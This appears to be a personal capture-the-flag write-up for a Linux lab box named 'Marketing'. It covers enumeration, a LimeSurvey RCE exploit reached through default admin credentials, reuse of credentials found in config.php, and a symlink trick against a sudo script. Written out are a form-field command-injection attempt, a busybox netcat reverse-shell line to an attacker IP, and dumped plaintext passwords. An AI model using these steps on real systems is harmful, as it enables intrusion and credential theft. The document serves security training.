# Marketing \[Linux]

## Summary

* If you know the play is to find subdomain, grep master domain in source (grep "marketing.pg")
* Run linpeas again after getting new user, new files may be accessible that weren't before
* Didn't check my groups - the mlocate.db which was accessible via our group had the info
* Lacked in bash thought it was checking file content instead of the name and `-z`

## Enumeration

```
192.168.125.225
sudo nmap -v 192.168.125.225 -sC -sV -p- --open -oN tcpscan.nmap
Nmap scan report for 192.168.125.225
Host is up (0.86s latency).
Not shown: 57968 closed tcp ports (reset), 7565 filtered 
Some closed ports may be reported as filtered due to --de
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubu
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: marketing.pg - Digital Marketing for you!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### UDP

```
sudo nmap -sU --top-ports 20 -oN udpscan.nmap -vv 192.168.125.225
Nothing
```

### Files

<pre data-title="/usr/bin/sync.sh [t.miller can run as sudo]"><code>#! /bin/bash

<strong>if [ -z $1 ]; then
</strong>    echo "error: note missing"
    exit
fi

note=$1

if [[ "$note" =~ .*m.sander.* ]]; then
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/m.sander/personal/notes.txt $note)

if [[ -z $difference ]]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/m.sander/personal/notes.txt

echo "[+] Updated."
</code></pre>

It checks if file's path name has m.sander in it just the path and if not it prints the difference between our file and that in the notes.txt

`-z` return true if empty

### Ports

#### 80

All we have for this one

We have a userlist, a contact page and and an endpoint 'old'

* No Virtual hosts either
* Fuzzing ain't do allat
* We have a contact page that redirects to index but some input injection could be juicy
* Web server version isn't vulnerable

FUZZ

Tried with .php and .html but nothing much

```
ffuf -w /usr/share/wordlists/dirbuster/raft-medium-directories.txt -u http://marketing.pg/FUZZ 
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 100ms]
old                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 103ms]
vendor                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 77ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 95ms]

ffuf -w /usr/share/wordlists/dirbuster/raft-medium-directories.txt -u http://marketing.pg/old/FUZZ
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 123ms]
vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 2334ms]
```

<div align="left"><figure><img src="../../.gitbook/assets/image (106).png" alt="" width="247"><figcaption></figcaption></figure></div>

CONTACT

Try in both current and 'old' too

<div align="left"><figure><img src="../../.gitbook/assets/image (107).png" alt="" width="361"><figcaption><p>why they mention PHP sus</p></figcaption></figure></div>

Normally the contact pages on these don't go anywhere

<div align="left"><figure><img src="../../.gitbook/assets/image (108).png" alt="" width="563"><figcaption></figcaption></figure></div>

Code Injection (No work)

```
name=hth&email=jjean9569%40gmail.com;ping+192.168.45.167&message=yhyh
```

SSRF not possible cus we not taking any URL but XSS left but im lazy for that

#### Subdomain

```
ffuf -w /usr/share/wordlists/dirbuster/raft-medium-directories.txt -u http://customers-survey.marketing.pg/FUZZ

.git                    [Status: 403, Size: 294, Words: 20, Lines: 10, Duration: 91ms]
themes                  [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 91ms]
.github                 [Status: 403, Size: 294, Words: 20, Lines: 10, Duration: 89ms]
docs                    [Status: 403, Size: 294, Words: 20, Lines: 10, Duration: 80ms]
assets                  [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 119ms]
upload                  [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 88ms]
admin                   [Status: 301, Size: 346, Words: 20, Lines: 10, Duration: 2346ms]
modules                 [Status: 301, Size: 348, Words: 20, Lines: 10, Duration: 4818ms]
.gitlab                 [Status: 403, Size: 294, Words: 20, Lines: 10, Duration: 4818ms]
plugins                 [Status: 301, Size: 348, Words: 20, Lines: 10, Duration: 4820ms]
tmp                     [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 4820ms]
application             [Status: 403, Size: 294, Words: 20, Lines: 10, Duration: 100ms]
tests                   [Status: 301, Size: 346, Words: 20, Lines: 10, Duration: 101ms]
installer               [Status: 301, Size: 350, Words: 20, Lines: 10, Duration: 106ms]
locale                  [Status: 403, Size: 294, Words: 20, Lines: 10, Duration: 103ms]
framework               [Status: 403, Size: 294, Words: 20, Lines: 10, Duration: 91ms]
server-status           [Status: 403, Size: 294, Words: 20, Lines: 10, Duration: 91ms]
LICENSE                 [Status: 200, Size: 49474, Words: 8494, Lines: 975, Duration: 102ms]
```

Admin

```
http://customers-survey.marketing.pg/index.php/admin/authentication/sa/login
```

`admin:password` works

Version 5.3.24 the other exploit prolly doesn't work but let's try

#### 3306

No SQL access here

```
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
www-data@marketing:/var/www/LimeSurvey$ mmysql -h localhost -uroot -ppassword
mysql -h localhost -uroot -ppassword
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
```

Found the creds in LimeSurvey config.php

```
mysql -h localhost -ulimesurvey_user -p       
Enter password: EzPwz2022_dev1$$23!!
```

### Exploits

{% embed url="https://www.exploit-db.com/exploits/50573" %}

{% embed url="https://github.com/godylockz/CVE-2021-44967" %}
This one worked
{% endembed %}

### Loot

#### Creds

`t.miller:EzPwz2022_dev1$$23!!`

`m.sander:EzPwz2022_12345678#!`

#### Flags

```
ff7922b50ae7ec28cf76a7cbf045d1d7
2f216619de134ae2bdc3756dddb04d56
```

## Initial Foothold

The 'old' endpoint had a hyperlink in source that mentions use of another subdomain that we couldn't fuzz

Expanding in Dev tools just doesn't cut it

<div align="left"><figure><img src="../../.gitbook/assets/image (109).png" alt="" width="563"><figcaption></figcaption></figure></div>

<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

```
admin:password default creds
python3 limesurvey_rce.py --url http://customers-survey.marketing.pg -u admin -p password
```

<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

## PrivEsc

```
(From /etc/passwd)
t.miller:x:1000:1000::/home/t.miller:/bin/bash
m.sander:x:1001:1001::/home/m.sander:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false

State    Recv-Q   Send-Q       Local Address:Port          Peer Address:Port    Process                                                                         
LISTEN   0        4096         127.0.0.53%lo:53                 0.0.0.0:*                                                                                       
LISTEN   0        128                0.0.0.0:22                 0.0.0.0:*                                                                                       
LISTEN   0        70               127.0.0.1:33060              0.0.0.0:*                                                                                       
LISTEN   0        151              127.0.0.1:3306               0.0.0.0:*                                                                                       
LISTEN   0        511                0.0.0.0:80                 0.0.0.0:* 
```

```
/var/www/LimeSurvey/application/config/config.php
'username' => 'limesurvey_user'
'password' => 'EzPwz2022_dev1$$23!!'
```

These creds work for SQL but more importantly they work for t.miller

#### t.miller

```
User t.miller may run the following commands on marketing:
    (m.sander) /usr/bin/sync.sh
    
sudo -u m.sander /usr/bin/sync.sh

t.miller@marketing:~$ echo 'm.sander' > note

t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh note
Difference: 1,3c1
< == NOTES ==
< - remove vhost from website (done)
< - update to newer version (todo)
\ No newline at end of file
---
> m.sander
[+] Updated.
```

Tried code injection here since the diff command takes our input like that

{% code title="" %}
```
echo 'm.sander;busybox nc 192.168.45.167 443 -e /bin/bash' > note
```
{% endcode %}

### Hint

Run LinPEAS again to find a unique file `mlocate.db` which stores information about the indexed file system&#x20;

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

Now that we know the file whose contents we want to dump, it becomes a lot simpler. Use a symlink to bypass the condition that checks for 'm.sander' in our file path and voila.

{% code title="" %}
```
t.miller@marketing:~$ ln -s /home/m.sander/personal/creds-for-2022.txt note

t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh note

Difference: 1c1,8
< m.sander;busybox nc 192.168.45.167 443 -e /bin/bash
---
> slack account:
> michael_sander@gmail.com - pa$$word@123$$4!!
> 
> github:
> michael_sander@gmail.com - EzPwz2022_dev1$$23!!
> 
> gmail:
> michael_sander@gmail.com - EzPwz2022_12345678#!
\ No newline at end of file
[+] Updated.

```
{% endcode %}

## Post Exploitation

* m.sanders is root all root perms
* We tried symlink for id\_rsa but no file was found
* We can cd into home of m.sanders but not '/personal'

{% code title="" %}
```
t.miller@marketing:~$ ln -s /home/m.sander/.ssh/id_rsa note
t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh note

diff: note: No such file or directory
no update
```
{% endcode %}

<div align="left"><figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure></div>

Look at our groups, that made the difference

{% code title="" %}
```
uid=1000(t.miller) gid=1000(t.miller) groups=1000(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)
```
{% endcode %}

I figured out why command exec wouldn't work

the command has to be in the file name eg. diff note $var \[our var file name has the busybox command]

if we add a ';' or '||' the actuall command will get cooked and we exit sudo at that point

#### Rant

Why did I give up after fumbling at the sudo part, I needed more info, I knew I had to read a file but which one?

I knew root was out of scope since we running as m.sanders&#x20;

Why didn't I circle back?
